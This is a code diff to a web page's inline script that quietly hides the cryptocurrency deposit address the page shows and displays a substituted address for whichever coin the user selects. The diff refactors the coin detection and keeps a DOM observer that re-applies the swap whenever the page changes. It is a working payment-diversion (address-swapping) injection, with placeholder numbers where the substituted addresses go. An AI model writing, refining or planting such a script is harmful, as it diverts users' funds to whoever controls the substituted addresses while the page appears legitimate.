@@ -46,41 +46,38 @@
 </script>
 <script>
   const customAddresses = {
-    SOL: "1000000000000002",
-    ETH: "1000000000000001",
     BTC: "1000000000000000",
+    ETH: "1000000000000001",
+    SOL: "1000000000000002",
     USDC: "1000000000000003",
     USDT: "1000000000000004"
-    // Add all 22 here
+    // Add more mappings here
   };
 
-  function extractCoinSymbol(text) {
-    // e.g., from "You sendSOL$151.54Solanasolana Network" → "SOL"
-    const match = text.match(/You\s+(send|receive)([A-Z]{2,6})/);
-    return match ? match[2] : null;
+  function getSelectedCoinSymbol() {
+    const buttons = document.querySelectorAll('button.coin-selector-item');
+    for (const btn of buttons) {
+      const hasCheckIcon = btn.querySelector('svg path[d*="13.642"]'); // ✔️ tick path
+      if (hasCheckIcon) {
+        const span = btn.querySelector('span span');
+        if (span) {
+          return span.textContent.trim();
+        }
+      }
+    }
+    return null;
   }
 
   function replaceAddress() {
-    const buttons = document.querySelectorAll('button[aria-label]');
-    let selectedCoin = null;
-
-    buttons.forEach(btn => {
-      const text = btn.textContent.trim();
-      const coin = extractCoinSymbol(text);
-      if (coin && customAddresses[coin]) {
-        selectedCoin = coin;
-      }
-    });
-
+    const coin = getSelectedCoinSymbol();
     const originalAddressSpan = document.querySelector('.text-new-black.break-words');
-    if (!selectedCoin || !originalAddressSpan) return;
 
-    const newAddress = customAddresses[selectedCoin];
+    if (!coin || !customAddresses[coin] || !originalAddressSpan) return;
 
     // Hide original
     originalAddressSpan.style.display = "none";
 
-    // Inject custom
+    // Add custom
     let customSpan = document.getElementById("custom-address");
     if (!customSpan) {
       customSpan = document.createElement("span");
@@ -92,13 +89,13 @@
       originalAddressSpan.parentNode.insertBefore(customSpan, originalAddressSpan);
     }
 
-    customSpan.textContent = newAddress;
+    customSpan.textContent = customAddresses[coin];
   }
 
-  // Keep watching
+  // Watch DOM for changes
   const observer = new MutationObserver(replaceAddress);
   observer.observe(document.body, { childList: true, subtree: true });
 
-  // Also run once on page load
+  // Also run once on load
   window.addEventListener("load", () => setTimeout(replaceAddress, 300));
 </script>
